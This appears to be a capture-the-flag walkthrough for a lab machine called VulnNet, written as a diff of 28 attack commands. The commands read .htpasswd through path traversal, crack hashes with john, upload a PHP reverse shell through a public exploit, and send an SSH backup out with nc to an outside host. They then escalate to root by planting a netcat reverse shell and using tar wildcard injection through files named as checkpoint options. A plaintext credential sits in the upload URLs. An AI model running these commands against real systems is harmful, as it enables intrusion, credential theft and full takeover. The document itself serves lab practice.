@@ -1,0 +1,28 @@
+1 - echo "10.10.248.27 vulnnet.thm" | tee -a /etc/hosts
+2 - nmap -A 10.10.248.27
+3 - view-source:http://10.10.248.27/js/index__7ed54732.js
+4 - echo "10.10.248.27 broadcast.vulnnet.thm" | tee -a /etc/hosts
+5 - view-source:http://vulnnet.thm/?referer=/etc/apache2/.htpasswd
+6 - john hash -w=/usr/share/wordlists/rockyou.txt
+7 - http://broadcast.vulnnet.thm
+8 - searchsploit -m 44250
+9 - curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=php-reverse-shell.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
+10 - http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/1681653024e8ef69.php
+11 - cat /etc/crontab
+12 - ls /var/backups
+13 - nc 10.8.94.51 4445 < ssh-backup.tar.gz
+14 - nc -lvnp 4445 > ssh-backup.tar.gz
+15 - gunzip ssh-backup.tar.gz
+16 - tar xvf ssh-backup.tar
+17 - ssh2john id_rsa > hash
+18 - john hash -w=/usr/share/wordlists/rockyou.txt
+19 - chmod 600 id_rsa
+20 - ssh -i id_rsa server-management@10.10.248.27
+21 - cat user.txt
+22 - cat /etc/crontab 
+23 - cat /var/opt/backupsrv.sh (tar wildcard injection)
+24 - echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.94.51 4444 > /tmp/f" > /home/server-management/Documents/shell.sh
+25 - chmod +x shell.sh
+26 - echo "" > "/home/server-management/Documents/--checkpoint=1"
+27 - echo "" > "/home/server-management/Documents/--checkpoint-action=exec=sh shell.sh"
+28 - cat /root/root.txt
